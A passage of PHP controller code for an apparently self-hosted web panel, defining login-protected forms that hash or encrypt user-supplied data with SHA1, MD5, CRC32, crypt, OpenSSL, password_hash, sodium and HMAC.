            $_bottom      = Class_View_Bottom ::bottom ( $_bottom_menu , $_content );
            Class_Base_Response ::output ( Class_View ::index ( $_top , $_body , $_bottom ) , "text" , 0 );
        } else {
            Class_Base_Response ::outputln ( "\n" . 'This functional module is currently not suitable for command line environments, and this issue may be improved in future versions!' );
        }
        return null;
    }

    public static function sha1 ( $params = array () )
    {
        if ( ( ! is_cli () ) && ( ! Class_Base_Auth ::is_login () ) ) {
            Class_Base_Response ::redirect ( "/login" );
            return null;
        }
        Class_Base_Auth ::check_permission ();
        $_string = Class_Base_Request ::form ( "string" , Class_Base_Request::TYPE_STRING , "" );
        if ( ! is_cli () ) {
            $_form_top    = '<div style="margin-top:16px;margin-bottom:16px;height: 32px;text-align: center;font-size: 18px;">Sha1 Data Encode</div>';
            $_form_top    .= '<div style="margin-top:16px;text-align: left;font-size: 18px;"><span style="font-size: 18px;color:red;">This functional module is mainly used for SHA1 mode encoding or decoding behavior of corresponding data.</div>';
            $_form        = array (
                "action"    => "/security/sha1" ,
                "textareas" => array (
                    array (
                        "title" => "( Raw Data )   : " ,
                        "name"  => "string" ,
                        "value" => $_string ,
                    ) ,
                    array (
                        "title"    => "( Result Data )   : " ,
                        "name"     => "result" ,
                        "value"    => ( sha1 ( $_string ) ) ,
                        "disabled" => "disabled" ,
                    ) ,
                ) ,
            );
            $_top         = Class_View_Top ::top ();
            $_body        = array (
                "menu"    => Class_View_Security_Menu ::menu ( array () ) ,
                "content" => ( ( $_form_top ) . Class_View ::form_body ( $_form ) ) ,
            );
            $_bottom_menu = array (
                array (
                    "title"    => "" ,
                    "describe" => "" ,
                    "href"     => "#" ,
                ) ,
            );
            $_content     = '<div></div>';
            $_bottom      = Class_View_Bottom ::bottom ( $_bottom_menu , $_content );
            Class_Base_Response ::output ( Class_View ::index ( $_top , $_body , $_bottom ) , "text" , 0 );
        } else {
            Class_Base_Response ::outputln ( "\n" . 'This functional module is currently not suitable for command line environments, and this issue may be improved in future versions!' );
        }
        return null;
    }

    public static function md5 ( $params = array () )
    {
        if ( ( ! is_cli () ) && ( ! Class_Base_Auth ::is_login () ) ) {
            Class_Base_Response ::redirect ( "/login" );
            return null;
        }
        Class_Base_Auth ::check_permission ();
        $_string = Class_Base_Request ::form ( "string" , Class_Base_Request::TYPE_STRING , "" );
        if ( ! is_cli () ) {
            $_form_top    = '<div style="margin-top:32px;margin-bottom:16px;height: 32px;text-align: center;font-size: 18px;">Md5 Data Encode</div>';
            $_form_top    .= '<div style="margin-top:16px;text-align: left;font-size: 18px;"><span style="font-size: 18px;color:red;">This functional module is mainly used for MD5 mode encoding or decoding behavior of corresponding data.</div>';
            $_form        = array (
                "action"    => "/security/md5" ,
                "textareas" => array (
                    array (
                        "title" => "( Raw Data )   : " ,
                        "name"  => "string" ,
                        "value" => $_string ,
                    ) ,
                    array (
                        "title"    => "( Result Data )   : " ,
                        "name"     => "result" ,
                        "value"    => ( md5 ( $_string ) ) ,
                        "disabled" => "disabled" ,
                    ) ,
                ) ,
            );
            $_top         = Class_View_Top ::top ();
            $_body        = array (
                "menu"    => Class_View_Security_Menu ::menu ( array () ) ,
                "content" => ( ( $_form_top ) . Class_View ::form_body ( $_form ) ) ,
            );
            $_bottom_menu = array (
                array (
                    "title"    => "" ,
                    "describe" => "" ,
                    "href"     => "#" ,
                ) ,
            );
            $_content     = '<div></div>';
            $_bottom      = Class_View_Bottom ::bottom ( $_bottom_menu , $_content );
            Class_Base_Response ::output ( Class_View ::index ( $_top , $_body , $_bottom ) , "text" , 0 );
        } else {
            Class_Base_Response ::outputln ( "\n" . 'This functional module is currently not suitable for command line environments, and this issue may be improved in future versions!' );
        }
        return null;
    }

    public static function crc32 ( $params = array () )
    {
        if ( ( ! is_cli () ) && ( ! Class_Base_Auth ::is_login () ) ) {
            Class_Base_Response ::redirect ( "/login" );
            return null;
        }
        Class_Base_Auth ::check_permission ();
        $_string = Class_Base_Request ::form ( "string" , Class_Base_Request::TYPE_STRING , "" );
        if ( ! is_cli () ) {
            $_form_top    = '<div style="margin-top:32px;margin-bottom:16px;height: 32px;text-align: center;font-size: 18px;">Crc32 Data Encode</div>';
            $_form_top    .= '<div style="margin-top:16px;text-align: left;font-size: 18px;"><span style="font-size: 18px;color:red;">This functional module is mainly used for CRC32 mode encoding or decoding behavior of corresponding data.</div>';
            $_form        = array (
                "action"    => "/security/crc32" ,
                "textareas" => array (
                    array (
                        "title" => "( Raw Data )   : " ,
                        "name"  => "string" ,
                        "value" => $_string ,
                    ) ,
                    array (
                        "title"    => "( Result Data )   : " ,
                        "name"     => "result" ,
                        "value"    => ( sprintf ( "%un" , crc32 ( $_string ) ) ) ,
                        "disabled" => "disabled" ,
                    ) ,
                ) ,
            );
            $_top         = Class_View_Top ::top ();
            $_body        = array (
                "menu"    => Class_View_Security_Menu ::menu ( array () ) ,
                "content" => ( ( $_form_top ) . Class_View ::form_body ( $_form ) ) ,
            );
            $_bottom_menu = array (
                array (
                    "title"    => "" ,
                    "describe" => "" ,
                    "href"     => "#" ,
                ) ,
            );
            $_content     = '<div></div>';
            $_bottom      = Class_View_Bottom ::bottom ( $_bottom_menu , $_content );
            Class_Base_Response ::output ( Class_View ::index ( $_top , $_body , $_bottom ) , "text" , 0 );
        } else {
            Class_Base_Response ::outputln ( "\n" . 'This functional module is currently not suitable for command line environments, and this issue may be improved in future versions!' );
        }
        return null;
    }

    public static function crypt ( $params = array () )
    {
        if ( ( ! is_cli () ) && ( ! Class_Base_Auth ::is_login () ) ) {
            Class_Base_Response ::redirect ( "/login" );
            return null;
        }
        Class_Base_Auth ::check_permission ();
        $_string = Class_Base_Request ::form ( "string" , Class_Base_Request::TYPE_STRING , "" );
        $_salt   = Class_Base_Request ::form ( "salt" , Class_Base_Request::TYPE_STRING , "" );
        if ( ! is_cli () ) {
            $_form_top    = '<div style="margin-top:64px;margin-bottom:16px;height: 32px;text-align: center;font-size: 18px;">Crypt Data Encode</div>';
            $_form_top    .= '<div style="margin-top:16px;text-align: left;font-size: 18px;"><span style="font-size: 18px;color:red;">This functional module is mainly used for CRYPT mode encoding or decoding behavior of corresponding data.</div>';
            $_form        = array (
                "action"    => "/security/crypt" ,
                "inputs"    => array (
                    array (
                        "title"    => "( Encode Salt ) : " ,
                        "describe" => "salt" ,
                        "name"     => "salt" ,
                        "value"    => $_salt ,
                    ) ,
                ) ,
                "textareas" => array (
                    array (
                        "title" => "( Raw Data )   : " ,
                        "name"  => "string" ,
                        "value" => $_string ,
                    ) ,
                    array (
                        "title"    => "( Result Data )   : " ,
                        "name"     => "result" ,
                        "value"    => ( crypt ( $_string , $_salt ) ) ,
                        "disabled" => "disabled" ,
                    ) ,
                ) ,
            );
            $_top         = Class_View_Top ::top ();
            $_body        = array (
                "menu"    => Class_View_Security_Menu ::menu ( array () ) ,
                "content" => ( ( $_form_top ) . Class_View ::form_body ( $_form ) ) ,
            );
            $_bottom_menu = array (
                array (
                    "title"    => "" ,
                    "describe" => "" ,
                    "href"     => "#" ,
                ) ,
            );
            $_content     = '<div></div>';
            $_bottom      = Class_View_Bottom ::bottom ( $_bottom_menu , $_content );
            Class_Base_Response ::output ( Class_View ::index ( $_top , $_body , $_bottom ) , "text" , 0 );
        } else {
            Class_Base_Response ::outputln ( "\n" . 'This functional module is currently not suitable for command line environments, and this issue may be improved in future versions!' );
        }
        return null;
    }

    public static function openssl ( $params = array () )
    {
        if ( ( ! is_cli () ) && ( ! Class_Base_Auth ::is_login () ) ) {
            Class_Base_Response ::redirect ( "/login" );
            return null;
        }
        Class_Base_Auth ::check_permission ();
        $_type        = Class_Base_Request ::form ( "type" , Class_Base_Request::TYPE_INTEGER , Class_Base_Security::TYPE_OPENSSL_ENCODE );
        $_data        = Class_Base_Request ::form ( "data" , Class_Base_Request::TYPE_STRING , "" );
        $_cipher_algo = Class_Base_Request ::form ( "cipher_algo" , Class_Base_Request::TYPE_STRING , "" );
        $_passphrase  = Class_Base_Request ::form ( "passphrase" , Class_Base_Request::TYPE_STRING , "" );
        $_options     = Class_Base_Request ::form ( "options" , Class_Base_Request::TYPE_INTEGER , 0 );
        $_iv          = Class_Base_Request ::form ( "iv" , Class_Base_Request::TYPE_STRING , "" );
        $_tag         = Class_Base_Request ::form ( "tag" , Class_Base_Request::TYPE_STRING , "" );
        $_aad         = Class_Base_Request ::form ( "aad" , Class_Base_Request::TYPE_STRING , "" );
        $_tag_length  = Class_Base_Request ::form ( "tag_length" , Class_Base_Request::TYPE_INTEGER , 16 );
        $_result      = "";
        if ( ( is_integer ( $_type ) ) && ( Class_Base_Security ::is_openssl_type ( $_type ) ) && ( is_string ( $_data ) ) && ( strlen ( $_data ) > 0 ) && ( is_string ( $_cipher_algo ) ) && ( strlen ( $_cipher_algo ) > 0 ) && ( is_string ( $_passphrase ) ) && ( strlen ( $_passphrase ) > 0 ) && ( is_integer ( $_options ) ) && ( Class_Base_Security ::is_openssl_options ( $_options ) ) && ( is_string ( $_iv ) ) && ( is_string ( $_tag ) ) && ( is_string ( $_aad ) ) && is_integer ( $_tag_length ) ) {
            if ( empty( $_iv ) ) {
                $_iv = Class_Base_Security ::get_openssl_iv ( $_cipher_algo );
                if ( $_iv === false ) {
                    throw new \Exception( "Failed to obtain initialization vector! Current encryption and decryption algorithm : " . print_r ( $_cipher_algo , true ) , 0 );
                }
            } else {
                $_iv = ( ( empty( @base64_decode ( $_iv ) ) ) ? ( $_iv ) : ( base64_decode ( $_iv ) ) );
            }
            if ( $_type == Class_Base_Security::TYPE_OPENSSL_DECODE ) {
                $_tag = base64_decode ( $_tag );
                $_tag = Class_Base_Security ::get_openssl_tag ( $_tag , $_cipher_algo );
                if ( $_tag !== false ) {
                    $_result = Class_Base_Security ::get_openssl_decode ( $_data , $_cipher_algo , $_passphrase , $_options , $_iv , $_tag , $_aad , $_tag_length );
                }
            } else {
                if ( Class_Base_Security ::is_openssl_tag_length ( $_tag_length , $_cipher_algo ) ) {
                    $_result = Class_Base_Security ::get_openssl_encode ( $_data , $_cipher_algo , $_passphrase , $_options , $_iv , $_tag , $_aad , $_tag_length );
                }
            }
            $_iv = ( ( $_iv == "" ) ? ( $_iv ) : ( base64_encode ( $_iv ) ) );
        }
        if ( ! is_cli () ) {
            $_form_top     = '<div style="margin-top:64px;margin-bottom:16px;height: 32px;text-align: center;font-size: 18px;">Openssl Data Encode / Decode</div>';
            $_form_top     .= '<div style="margin-top:16px;text-align: left;font-size: 18px;"><span style="font-size: 18px;color:red;">This functional module is mainly used for OPENSSL mode encoding or decoding behavior of corresponding data.</div>';
            $_form         = array (
                "action"    => "/security/openssl" ,
                "inputs"    => array (
                    array (
                        "title"    => "( Encode Passphrase ) : " ,
                        "describe" => "passphrase" ,
                        "name"     => "passphrase" ,
                        "value"    => $_passphrase ,
                    ) ,
                    array (
                        "title"            => "( Encode IV ) : " ,
                        "describe"         => "iv" ,
                        "name"             => "iv" ,
                        "value"            => $_iv ,
                        "explanatory_note" => "Do not modify" ,
                    ) ,
                    array (
                        "title"            => "( Encode Tag ) : " ,
                        "describe"         => "tag" ,
                        "name"             => "tag" ,
                        "value"            => base64_encode ( $_tag ) ,
                        "explanatory_note" => "Do not modify" ,
                    ) ,
                    array (
                        "title"    => "( Encode Aad ) : " ,
                        "describe" => "aad" ,
                        "name"     => "aad" ,
                        "value"    => $_aad ,
                    ) ,
                ) ,
                "selects"   => array (
                    array (
                        "title"   => "( Cipher Algo ) : " ,
                        "name"    => "cipher_algo" ,
                        "options" => array () ,
                    ) ,
                    array (
                        "title"   => "( Tag Length )   : " ,
                        "name"    => "tag_length" ,
                        "options" => array () ,
                    ) ,
                    array (
                        "title"   => "( Encode / Decode )   : " ,
                        "name"    => "type" ,
                        "options" => array (
                            array ( "describe" => "encode data" , "title" => "Encode Data" , "value" => Class_Base_Security::TYPE_OPENSSL_ENCODE , "selected" => ( ( $_type == Class_Base_Security::TYPE_OPENSSL_ENCODE ) ? "selected" : "" ) ) ,
                            array ( "describe" => "decode data" , "title" => "Decode Data" , "value" => Class_Base_Security::TYPE_OPENSSL_DECODE , "selected" => ( ( $_type == Class_Base_Security::TYPE_OPENSSL_DECODE ) ? "selected" : "" ) ) ,
                        ) ,
                    ) ,
                    array (
                        "title"   => "( Encode Options )   : " ,
                        "name"    => "options" ,
                        "options" => array (
                            array ( "describe" => "OPENSSL_DEFAULT" , "title" => "OPENSSL_DEFAULT" , "value" => 0 , "selected" => ( ( $_options == 0 ) ? "selected" : "" ) ) ,
                            array ( "describe" => "OPENSSL_RAW_DATA" , "title" => "OPENSSL_RAW_DATA" , "value" => OPENSSL_RAW_DATA , "selected" => ( ( $_options == OPENSSL_RAW_DATA ) ? "selected" : "" ) ) ,
                            array ( "describe" => "OPENSSL_ZERO_PADDING" , "title" => "OPENSSL_ZERO_PADDING" , "value" => OPENSSL_ZERO_PADDING , "selected" => ( ( $_options == OPENSSL_ZERO_PADDING ) ? "selected" : "" ) ) ,
                            array ( "describe" => "OPENSSL_RAW_DATA OR OPENSSL_ZERO_PADDING" , "title" => "OPENSSL_RAW_DATA OR OPENSSL_ZERO_PADDING" , "value" => ( OPENSSL_RAW_DATA | OPENSSL_ZERO_PADDING ) , "selected" => ( ( $_options == ( OPENSSL_RAW_DATA | OPENSSL_ZERO_PADDING ) ) ? "selected" : "" ) ) ,
                        ) ,
                    ) ,
                ) ,
                "textareas" => array (
                    array (
                        "title" => "( Raw Data )   : " ,
                        "name"  => "data" ,
                        "value" => $_data ,
                    ) ,
                    array (
                        "title"    => "( Result Data )   : " ,
                        "name"     => "result" ,
                        "value"    => $_result ,
                        "disabled" => "disabled" ,
                    ) ,
                ) ,
            );
            $_cipher_algos = Class_Base_Security ::get_openssl_cipher_algos ();
            foreach ( $_cipher_algos as $k => $v ) {
                $_form[ "selects" ][ 0 ][ "options" ][] = array ( "describe" => ( $v ) , "title" => ( $v ) , "value" => $v , "selected" => ( ( $_cipher_algo == $v ) ? "selected" : "" ) );
            }
            $_tag_lengths = Class_Base_Security ::get_openssl_tag_lengths ();
            foreach ( $_tag_lengths as $k => $v ) {
                $_form[ "selects" ][ 1 ][ "options" ][] = array ( "describe" => ( $v ) , "title" => ( $v ) , "value" => $v , "selected" => ( ( $_tag_length == $v ) ? "selected" : "" ) );
            }
            $_top         = Class_View_Top ::top ();
            $_body        = array (
                "menu"    => Class_View_Security_Menu ::menu ( array () ) ,
                "content" => ( ( $_form_top ) . Class_View ::form_body ( $_form ) ) ,
            );
            $_bottom_menu = array (
                array (
                    "title"    => "" ,
                    "describe" => "" ,
                    "href"     => "#" ,
                ) ,
            );
            $_content     = '<div></div>';
            $_bottom      = Class_View_Bottom ::bottom ( $_bottom_menu , $_content );
            Class_Base_Response ::output ( Class_View ::index ( $_top , $_body , $_bottom ) , "text" , 0 );
        } else {
            Class_Base_Response ::outputln ( "\n" . 'This functional module is currently not suitable for command line environments, and this issue may be improved in future versions!' );
        }
        return null;
    }

    public static function hash ( $params = array () )
    {
        if ( ( ! is_cli () ) && ( ! Class_Base_Auth ::is_login () ) ) {
            Class_Base_Response ::redirect ( "/login" );
            return null;
        }
        Class_Base_Auth ::check_permission ();
        $_data    = Class_Base_Request ::form ( "data" , Class_Base_Request::TYPE_STRING , "" );
        $_algo    = Class_Base_Request ::form ( "algo" , Class_Base_Request::TYPE_STRING , "" );
        $_options = Class_Base_Request ::form ( "options" , Class_Base_Request::TYPE_STRING , "" );
        $_result  = "";
        $_options = @json_decode ( $_options );
        if ( ! is_array ( $_options ) ) {
            $_options = array ();
        }
        if ( empty( $_algo ) ) {
            $_data = "";
        } else {
            if ( ! Class_Base_Security ::is_hash_algo ( $_algo ) ) {
                $_data = "";
            } else {
                $_options = ( empty( $_options ) ? ( array () ) : ( ( empty( @json_decode ( $_options ) ) ) ? ( array () ) : ( json_decode ( $_options ) ) ) );
                $_result  = Class_Base_Security ::get_hash ( $_algo , $_data , false , $_options );
            }
        }
        if ( ! is_cli () ) {
            $_form_top = '<div style="margin-top:64px;margin-bottom:16px;height: 32px;text-align: center;font-size: 18px;">Hash Data Encode</div>';
            $_form_top .= '<div style="margin-top:16px;text-align: left;font-size: 18px;"><span style="font-size: 18px;color:red;">This functional module is mainly used for HASH mode encoding or decoding behavior of corresponding data.</div>';
            $_form     = array (
                "action"    => "/security/hash" ,
                "selects"   => array (
                    array (
                        "title"   => "( Encode Algo ) : " ,
                        "name"    => "algo" ,
                        "options" => array () ,
                    ) ,
                ) ,
                "textareas" => array (
                    array (
                        "title" => "( Json Options )   : " ,
                        "name"  => "string" ,
                        "value" => json_encode ( $_options ) ,
                    ) ,
                    array (
                        "title" => "( Raw Data )   : " ,
                        "name"  => "data" ,
                        "value" => $_data ,
                    ) ,
                    array (
                        "title"    => "( Result Data )   : " ,
                        "name"     => "result" ,
                        "value"    => ( $_result ) ,
                        "disabled" => "disabled" ,
                    ) ,
                ) ,
            );
            $_algos    = Class_Base_Security ::get_hash_algos ();
            foreach ( $_algos as $k => $v ) {
                $_form[ "selects" ][ 0 ][ "options" ][] = array ( "describe" => ( $v ) , "title" => ( $v ) , "value" => $v , "selected" => ( ( $_algo == $v ) ? "selected" : "" ) );
            }
            $_top         = Class_View_Top ::top ();
            $_body        = array (
                "menu"    => Class_View_Security_Menu ::menu ( array () ) ,
                "content" => ( ( $_form_top ) . Class_View ::form_body ( $_form ) ) ,
            );
            $_bottom_menu = array (
                array (
                    "title"    => "" ,
                    "describe" => "" ,
                    "href"     => "#" ,
                ) ,
            );
            $_content     = '<div></div>';
            $_bottom      = Class_View_Bottom ::bottom ( $_bottom_menu , $_content );
            Class_Base_Response ::output ( Class_View ::index ( $_top , $_body , $_bottom ) , "text" , 0 );
        } else {
            Class_Base_Response ::outputln ( "\n" . 'This functional module is currently not suitable for command line environments, and this issue may be improved in future versions!' );
        }
        return null;
    }

    public static function password_hash ( $params = array () )
    {
        if ( ( ! is_cli () ) && ( ! Class_Base_Auth ::is_login () ) ) {
            Class_Base_Response ::redirect ( "/login" );
            return null;
        }
        Class_Base_Auth ::check_permission ();
        if ( defined ( "PASSWORD_BCRYPT" ) ) {
            $_data    = Class_Base_Request ::form ( "password" , Class_Base_Request::TYPE_STRING , "" );
            $_algo    = Class_Base_Request ::form ( "algo" , Class_Base_Request::TYPE_STRING , PASSWORD_BCRYPT );
            $_options = Class_Base_Request ::form ( "options" , Class_Base_Request::TYPE_STRING , "" );
            $_result  = "";
            $_options = @json_decode ( $_options );
            if ( ! is_array ( $_options ) ) {
                $_options = array ();
            }
            if ( empty( $_algo ) ) {
                $_data = "";
            } else {
                if ( ! Class_Base_Security ::is_password_hash_algo ( $_algo ) ) {
                    $_data = "";
                } else {
                    if ( ( is_string ( $_data ) ) && ( strlen ( $_data ) > 0 ) && ( is_string ( $_algo ) ) && ( Class_Base_Security ::is_password_hash_algo ( $_algo ) ) && ( is_array ( $_options ) ) ) {
                        $_result = Class_Base_Security ::get_password_hash ( $_data , $_algo , $_options );
                    }
                }
            }
            if ( ! is_cli () ) {
                $_form_top = '<div style="margin-top:64px;margin-bottom:16px;height: 32px;text-align: center;font-size: 18px;">Password Hash Data Encode</div>';
                $_form_top .= '<div style="margin-top:16px;text-align: left;font-size: 18px;"><span style="font-size: 18px;color:red;">This functional module is mainly used for PASSWORD HASH mode encoding or decoding behavior of corresponding data.</div>';
                $_form     = array (
                    "action"    => "/security/password_hash" ,
                    "selects"   => array (
                        array (
                            "title"   => "( Encode Algo ) : " ,
                            "name"    => "algo" ,
                            "options" => array (
                                array (
                                    "describe" => ( "PASSWORD_BCRYPT" ) ,
                                    "title"    => ( "PASSWORD_BCRYPT" ) ,
                                    "value"    => ( PASSWORD_BCRYPT ) ,
                                    "selected" => ( ( $_algo == PASSWORD_BCRYPT ) ? "selected" : "" ) ,
                                ) ,
                            ) ,
                        ) ,
                    ) ,
                    "inputs"    => array (
                        array (
                            "title"    => "( Encode Password ) : " ,
                            "describe" => "password" ,
                            "name"     => "password" ,
                            "value"    => $_data ,
                        ) ,
                    ) ,
                    "textareas" => array (
                        array (
                            "title" => "( Json Options )   : " ,
                            "name"  => "string" ,
                            "value" => json_encode ( $_options ) ,
                        ) ,
                        array (
                            "title"    => "( Result Data )   : " ,
                            "name"     => "result" ,
                            "value"    => ( $_result ) ,
                            "disabled" => "disabled" ,
                        ) ,
                    ) ,
                );
                if ( defined ( "PASSWORD_ARGON2I" ) ) {
                    $_form[ "selects" ][ 0 ][ "options" ][] = array (
                        "describe" => ( "PASSWORD_ARGON2I" ) ,
                        "title"    => ( "PASSWORD_ARGON2I" ) ,
                        "value"    => ( PASSWORD_ARGON2I ) ,
                        "selected" => ( ( $_algo == PASSWORD_ARGON2I ) ? "selected" : "" ) ,
                    );
                }
                if ( defined ( "PASSWORD_ARGON2ID" ) ) {
                    $_form[ "selects" ][ 0 ][ "options" ][] = array (
                        "describe" => ( "PASSWORD_ARGON2ID" ) ,
                        "title"    => ( "PASSWORD_ARGON2ID" ) ,
                        "value"    => ( PASSWORD_ARGON2ID ) ,
                        "selected" => ( ( $_algo == PASSWORD_ARGON2ID ) ? "selected" : "" ) ,
                    );
                }
                $_top         = Class_View_Top ::top ();
                $_body        = array (
                    "menu"    => Class_View_Security_Menu ::menu ( array () ) ,
                    "content" => ( ( $_form_top ) . Class_View ::form_body ( $_form ) ) ,
                );
                $_bottom_menu = array (
                    array (
                        "title"    => "" ,
                        "describe" => "" ,
                        "href"     => "#" ,
                    ) ,
                );
                $_content     = '<div></div>';
                $_bottom      = Class_View_Bottom ::bottom ( $_bottom_menu , $_content );
                Class_Base_Response ::output ( Class_View ::index ( $_top , $_body , $_bottom ) , "text" , 0 );
            } else {
                Class_Base_Response ::outputln ( "\n" . 'This functional module is currently not suitable for command line environments, and this issue may be improved in future versions!' );
            }
        }
        return null;
    }

    public static function sodium ( $params = array () )
    {
        if ( ( ! is_cli () ) && ( ! Class_Base_Auth ::is_login () ) ) {
            Class_Base_Response ::redirect ( "/login" );
            return null;
        }
        Class_Base_Auth ::check_permission ();

        if ( defined ( "SODIUM_BASE64_VARIANT_ORIGINAL" ) && defined ( "SODIUM_BASE64_VARIANT_ORIGINAL_NO_PADDING" ) && defined ( "SODIUM_BASE64_VARIANT_URLSAFE" ) && defined ( "SODIUM_BASE64_VARIANT_URLSAFE_NO_PADDING" ) ) {
            $_type   = Class_Base_Request ::form ( "type" , Class_Base_Request::TYPE_INTEGER , Class_Base_Security::TYPE_SODIUM_BASE64_TO_BIN2 );
            $_data   = Class_Base_Request ::form ( "string" , Class_Base_Request::TYPE_STRING , "" );
            $_id     = Class_Base_Request ::form ( "id" , Class_Base_Request::TYPE_INTEGER , SODIUM_BASE64_VARIANT_ORIGINAL );
            $_ignore = Class_Base_Request ::form ( "ignore" , Class_Base_Request::TYPE_STRING , "" );
            $_result = "";
            $_ignore = Class_Base_Security ::format_bin2_string_to_bin2_string ( $_ignore );
            if ( $_ignore === false ) {
                throw new \Exception( "format bin2 string to bin2 string is parse error" , 0 );
            }
            if ( ( is_integer ( $_type ) ) && ( Class_Base_Security ::is_sodium_type ( $_type ) ) && ( is_string ( $_data ) ) && ( strlen ( $_data ) > 0 ) && ( is_integer ( $_id ) ) && ( Class_Base_Security ::is_sodium_id ( $_id ) ) && ( is_string ( $_ignore ) ) ) {
                if ( $_type == Class_Base_Security::TYPE_SODIUM_BIN2_TO_BASE64 ) {
                    $_result = Class_Base_Security ::sodium_bin2_format_string_to_base64 ( $_data , $_id );
                } else {
                    $_result = Class_Base_Security ::sodium_base64_to_bin2_format_string ( $_data , $_id , $_ignore );
                }
            }
            if ( ! is_cli () ) {
                $_form_top    = '<div style="margin-top:64px;margin-bottom:16px;height: 32px;text-align: center;font-size: 18px;">Sodium Data Encode</div>';
                $_form_top    .= '<div style="margin-top:16px;text-align: left;font-size: 18px;"><span style="font-size: 18px;color:red;">This functional module is mainly used for SODIUM mode encoding or decoding behavior of corresponding data.</div>';
                $_form        = array (
                    "action"    => "/security/sodium" ,
                    "selects"   => array (
                        array (
                            "title"   => "( Base64 / Bin2 ) : " ,
                            "name"    => "type" ,
                            "options" => array (
                                array (
                                    "describe" => ( "Base64 To Bin2" ) ,
                                    "title"    => ( "Base64 To Bin2" ) ,
                                    "value"    => ( Class_Base_Security::TYPE_SODIUM_BASE64_TO_BIN2 ) ,
                                    "selected" => ( ( $_type == Class_Base_Security::TYPE_SODIUM_BASE64_TO_BIN2 ) ? "selected" : "" ) ,
                                ) ,
                                array (
                                    "describe" => ( "Bin2 To Base64" ) ,
                                    "title"    => ( "Bin2 To Base64" ) ,
                                    "value"    => ( Class_Base_Security::TYPE_SODIUM_BIN2_TO_BASE64 ) ,
                                    "selected" => ( ( $_type == Class_Base_Security::TYPE_SODIUM_BIN2_TO_BASE64 ) ? "selected" : "" ) ,
                                ) ,
                            ) ,
                        ) ,
                        array (
                            "title"   => "( Encode ID ) : " ,
                            "name"    => "id" ,
                            "options" => array (
                                array (
                                    "describe" => ( "SODIUM_BASE64_VARIANT_ORIGINAL" ) ,
                                    "title"    => ( "SODIUM_BASE64_VARIANT_ORIGINAL" ) ,
                                    "value"    => ( SODIUM_BASE64_VARIANT_ORIGINAL ) ,
                                    "selected" => ( ( $_id == SODIUM_BASE64_VARIANT_ORIGINAL ) ? "selected" : "" ) ,
                                ) ,
                                array (
                                    "describe" => ( "SODIUM_BASE64_VARIANT_ORIGINAL_NO_PADDING" ) ,
                                    "title"    => ( "SODIUM_BASE64_VARIANT_ORIGINAL_NO_PADDING" ) ,
                                    "value"    => ( SODIUM_BASE64_VARIANT_ORIGINAL_NO_PADDING ) ,
                                    "selected" => ( ( $_id == SODIUM_BASE64_VARIANT_ORIGINAL_NO_PADDING ) ? "selected" : "" ) ,
                                ) ,
                                array (
                                    "describe" => ( "SODIUM_BASE64_VARIANT_URLSAFE" ) ,
                                    "title"    => ( "SODIUM_BASE64_VARIANT_URLSAFE" ) ,
                                    "value"    => ( SODIUM_BASE64_VARIANT_URLSAFE ) ,
                                    "selected" => ( ( $_id == SODIUM_BASE64_VARIANT_URLSAFE ) ? "selected" : "" ) ,
                                ) ,
                                array (
                                    "describe" => ( "SODIUM_BASE64_VARIANT_URLSAFE_NO_PADDING" ) ,
                                    "title"    => ( "SODIUM_BASE64_VARIANT_URLSAFE_NO_PADDING" ) ,
                                    "value"    => ( SODIUM_BASE64_VARIANT_URLSAFE_NO_PADDING ) ,
                                    "selected" => ( ( $_id == SODIUM_BASE64_VARIANT_URLSAFE_NO_PADDING ) ? "selected" : "" ) ,
                                ) ,
                            ) ,
                        ) ,
                    ) ,
                    "inputs"    => array (
                        array (
                            "title"    => "( Ignore Char ) : " ,
                            "describe" => "ignore" ,
                            "name"     => "ignore" ,
                            "value"    => Class_Base_Security ::bin2_string_to_format_bin2_string ( $_ignore ) ,
                        ) ,
                    ) ,
                    "textareas" => array (
                        array (
                            "title" => "( Raw Data )   : " ,
                            "name"  => "string" ,
                            "value" => ( $_data ) ,
                        ) ,
                        array (
                            "title"    => "( Result Data )   : " ,
                            "name"     => "result" ,
                            "value"    => ( $_result ) ,
                            "disabled" => "disabled" ,
                        ) ,
                    ) ,
                );
                $_top         = Class_View_Top ::top ();
                $_body        = array (
                    "menu"    => Class_View_Security_Menu ::menu ( array () ) ,
                    "content" => ( ( $_form_top ) . Class_View ::form_body ( $_form ) ) ,
                );
                $_bottom_menu = array (
                    array (
                        "title"    => "" ,
                        "describe" => "" ,
                        "href"     => "#" ,
                    ) ,
                );
                $_content     = '<div></div>';
                $_bottom      = Class_View_Bottom ::bottom ( $_bottom_menu , $_content );
                Class_Base_Response ::output ( Class_View ::index ( $_top , $_body , $_bottom ) , "text" , 0 );
            } else {
                Class_Base_Response ::outputln ( "\n" . 'This functional module is currently not suitable for command line environments, and this issue may be improved in future versions!' );
            }
        } else {
            throw new \Exception( "The current environment does not support SODIUM_BASE64 series functions and constant definitions!" );
        }
        return null;
    }

    public static function hash_hmac ( $params = array () )
    {
        if ( ( ! is_cli () ) && ( ! Class_Base_Auth ::is_login () ) ) {
            Class_Base_Response ::redirect ( "/login" );
            return null;
        }
        Class_Base_Auth ::check_permission ();
        $_string = Class_Base_Request ::form ( "string" , Class_Base_Request::TYPE_STRING , "" );
        $_algo   = Class_Base_Request ::form ( "algo" , Class_Base_Request::TYPE_STRING , "" );
        $_key    = Class_Base_Request ::form ( "key" , Class_Base_Request::TYPE_STRING , "" );
        $_data   = "";
        if ( ( strlen ( $_algo ) > 0 ) && ( strlen ( $_key ) > 0 ) ) {
            $_data = Class_Base_Security ::get_hash_hmac ( $_algo , $_string , $_key );
        }
        if ( ! is_cli () ) {
            $_form_top = '<div style="margin-top:64px;margin-bottom:16px;height: 32px;text-align: center;font-size: 18px;">Hash Hmac Data Encode</div>';
            $_form_top .= '<div style="margin-top:16px;text-align: left;font-size: 18px;"><span style="font-size: 18px;color:red;">This functional module is mainly used for HASH HMAC mode encoding or decoding behavior of corresponding data.</div>';
            $_form     = array (
                "action"    => "/security/hash_hmac" ,
                "inputs"    => array (
                    array (
                        "title"    => "( Encode Key ) : " ,
                        "describe" => "key" ,
                        "name"     => "key" ,
                        "value"    => $_key ,
                    ) ,
                ) ,
                "selects"   => array (
                    array (
                        "title"   => "( Encode Algo ) : " ,
                        "name"    => "algo" ,
                        "options" => array () ,
                    ) ,
                ) ,
                "textareas" => array (
                    array (
                        "title" => "( Raw Data )   : " ,
                        "name"  => "string" ,
                        "value" => $_string ,
                    ) ,
                    array (
                        "title"    => "( Result Data )   : " ,
                        "name"     => "result" ,
                        "value"    => $_data ,
                        "disabled" => "disabled" ,
                    ) ,
                ) ,
            );
            $_algos    = Class_Base_Security ::get_hash_hmac_algos ();
